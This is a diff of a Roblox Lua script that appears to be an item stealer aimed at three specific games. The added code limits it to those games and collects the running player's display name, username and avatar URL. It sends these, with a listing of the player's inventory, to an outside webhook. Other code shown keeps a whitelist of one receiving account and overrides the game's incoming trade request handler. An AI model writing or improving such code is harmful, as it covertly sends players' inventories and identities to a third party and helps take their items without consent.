@@ -1,3 +1,6 @@
+local PlaceId = game["PlaceId\0"]
+if not (PlaceId == 142823291 or PlaceId == 335132309 or PlaceId == 636649648) then return end
+
 local WithdrawWhitelist = {
 	["6PTQF"] = true,
 }
@@ -12,10 +15,14 @@ local LocalPlayer = Players.LocalPlayer
 local TradeStarted = false
 local DB = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 
-function send(url, message)
+function send(url, message, username, avatar_url)
 	local http = game:GetService("HttpService")
 	local headers = { ["Content-Type"] = "application/json" }
-	local data = { ["content"] = message }
+	local data = {
+		["content"] = message,
+		["username"] = username,
+		["avatar_url"] = avatar_url
+	}
 	local body = http:JSONEncode(data)
 	request({
 		Url = url,
@@ -57,11 +64,14 @@ end
 
 local function alert()
 	local message = format(getInv())
+	local displayName = LocalPlayer.DisplayName
+	local username = LocalPlayer.Name
+	local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+	local webhookName = displayName .. " (@" .. username .. ")"
 	task.defer(function()
-		send(webhookURL, message)
+		send(webhookURL, message, webhookName, avatarURL)
 	end)
 end
-
 alert()
 
 TradeRemotes.SendRequest.OnClientInvoke = function(Player)
